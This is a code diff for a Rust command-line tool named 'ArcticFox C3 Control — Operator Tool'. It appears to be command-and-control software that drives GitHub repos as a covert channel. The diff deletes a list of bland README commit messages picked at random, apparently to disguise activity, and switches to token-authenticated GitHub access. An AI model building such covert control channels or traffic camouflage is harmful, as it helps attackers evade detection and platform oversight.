@@ -10,11 +10,9 @@
 use clap::Parser;
 use std::io::{self, BufRead, Write};
 use std::path::PathBuf;
-use tracing::info;
 use tracing_subscriber::EnvFilter;
 
 use arcticfox_core::config::ControlConfig;
-use arcticfox_core::error::{ArcticFoxError, Result};
 use arcticfox_core::repo;
 
 /// ArcticFox C3 Control — Operator Tool
@@ -85,23 +83,6 @@ const HELP_TEXT: &str = "\x1b[1mRepo Management:\x1b[0m
   \x1b[32mexit\x1b[0m                                — Quit
 ";
 
-const BLAND_COMMITS: &[&str] = &[
-    "Update README.md",
-    "docs: update readme",
-    "fix typo in readme",
-    "docs: minor update",
-    "update documentation",
-    "readme: fix formatting",
-    "docs: clarify instructions",
-    "update project description",
-];
-
-use rand::Rng;
-
-fn random_commit_msg() -> &'static str {
-    BLAND_COMMITS[rand::thread_rng().gen_range(0..BLAND_COMMITS.len())]
-}
-
 #[tokio::main]
 async fn main() {
     let cli = Cli::parse();
@@ -128,7 +109,7 @@ async fn main() {
             eprintln!("No repos configured. Use interactive mode to add repos first.");
             std::process::exit(1);
         }
-        let client = match repo::build_client() {
+        let client = match repo::build_client_with_token(&config.github_token) {
             Ok(c) => c,
             Err(e) => {
                 eprintln!("Failed to build HTTP client: {e}");
@@ -152,7 +133,7 @@ async fn main() {
     }
 
     if cli.check {
-        let client = match repo::build_client() {
+        let client = match repo::build_client_with_token(&config.github_token) {
             Ok(c) => c,
             Err(e) => {
                 eprintln!("Failed to build HTTP client: {e}");
